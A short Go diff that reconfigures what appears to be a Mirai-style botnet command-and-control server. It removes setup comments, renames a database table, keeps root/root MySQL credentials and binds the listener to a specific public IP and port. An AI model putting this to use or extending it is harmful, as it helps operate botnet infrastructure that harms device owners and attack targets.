@@ -9,14 +9,14 @@ import (
 
 const DatabaseAddr string   = "127.0.0.1:3306"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "root"  //Change this to your mySQL password.
-const DatabaseTable string  = "gucci"
+const DatabasePass string   = "root"
+const DatabaseTable string  = "gang"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-    tel, err := net.Listen("tcp", "0.0.0.0:5555") //Change this too your server IP //:5555 Is the Client Port (connect port)
+    tel, err := net.Listen("tcp", "157.90.250.90:59666")
     if err != nil {
         fmt.Println(err)
         return
